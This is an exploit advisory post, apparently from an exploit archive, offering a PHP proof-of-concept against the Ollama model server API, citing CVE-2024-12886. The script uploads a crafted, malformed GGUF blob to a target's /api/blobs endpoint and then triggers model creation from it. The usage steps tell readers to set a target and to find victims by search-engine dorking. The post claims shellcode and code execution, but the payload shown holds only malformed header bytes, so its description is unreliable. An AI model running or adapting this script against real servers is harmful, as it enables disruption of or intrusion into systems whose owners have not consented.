=============================================================================================================================================
| # Title     : Ollama 0.5.11 php Code Execution Vulnerability                                                                              |
| # Author    : indoushka                                                                                                                   |
| # Tested on : windows 10 Fr(Pro) / browser : Mozilla firefox 136.0.0 (64 bits)                                                            |
| # Vendor    : https://github.com/ollama/ollama                                                                                            |
=============================================================================================================================================

POC :

[+] Dorking Ä°n Google Or Other Search Enggine.

[+] Code Description: This code uploads a GGUF model to a local server via API and then attempts to generate it using its SHA-256. However, 
                       
					  it contains malicious code such as shellcode that can be exploited to execute illegitimate instructions.

   (Related : https://packetstorm.news/files/id/189317/ Related CVE numbers: 	CVE-2024-12886 ) .
	
[+] save code as poc.php.

[+] Set target : Line 8

[+] Usage: php poc.php

[+] PayLoad :

<?php

function get_sha256($raw_content) {
    return hash('sha256', $raw_content);
}

function upload_model($model_raw_content) {
    $upload_url_base = 'http://localhost:11434/api/blobs/sha256:%s';
    $sha256 = get_sha256($model_raw_content);
    $upload_url = sprintf($upload_url_base, $sha256);
    $ch = curl_init($upload_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $model_raw_content);
    $response = curl_exec($ch);
    curl_close($ch);
    
    echo "upload_model response: " . $response . "\n";
    return $sha256;
}

function create_model($model_name, $sha256) {
    echo "create_model from file: ~/.ollama/models/blobs/sha256-{$sha256}\n";
    $url = 'http://localhost:11434/api/create';
    $data = [
        "model" => $model_name,
        "files" => [
            "test.gguf" => "sha256:{$sha256}"
        ]
    ];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    $response = curl_exec($ch);
    curl_close($ch);
    
    echo "create_model response: " . $response . "\n";
}

$model_contents = "FUGG00000000000000000000"; 
$model_contents .= "\x00\x00\x00\x01"; 
$model_contents .= "\x00\x00\x00\x01";
$model_contents .= "0000\xaa0000000";
$model_contents .= str_repeat("\x00", 1024);
$sha256 = upload_model($model_contents);
$model_name = "testing-model-" . uniqid();
create_model($model_name, $sha256);





Greetings to :=====================================================================================
jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
===================================================================================================